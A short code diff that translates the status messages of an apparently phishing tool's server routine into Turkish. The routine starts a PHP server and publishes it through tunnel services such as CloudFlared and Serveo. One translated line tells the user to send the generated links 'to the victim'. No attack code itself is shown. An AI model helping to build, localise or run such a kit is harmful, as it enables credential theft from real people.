@@ -1340,11 +1340,11 @@ def server():
         append(e, error_file)
         status_code = 400
     if status_code <= 400:
-        sprint(f"\n{info}PHP Server has started successfully!")
+        sprint(f"\n{info}PHP Sunucusu başarıyla başladı!!")
     else:
         sprint(f"\n{error}PHP Error! Code: {status_code}")
         pexit()
-    sprint(f"\n{info2}Initializing tunnelers at same address.....")
+    sprint(f"\n{info2}Tünel oluşturucular aynı adreste başlatılıyor.....")
     internet()
     arguments = ""
     if region is not None:
@@ -1388,7 +1388,7 @@ def server():
             break
         sleep(1)
     if cf_success or lx_success or lhr_success or svo_success:
-        sprint(f"\n{info}Your urls are given below:\n")
+        sprint(f"\n{info}Aşşağıdaki linklerden herhangi bir tanesini kurbana gönderin:\n")
         if mode == "test":
             print(f"\n{info}URL generation has completed successfully!")
             print(f"\n{info}CloudFlared: {cf_success}, LocalXpose: {lx_success}, LocalHR: {lhr_success}, Serveo: {svo_success}")
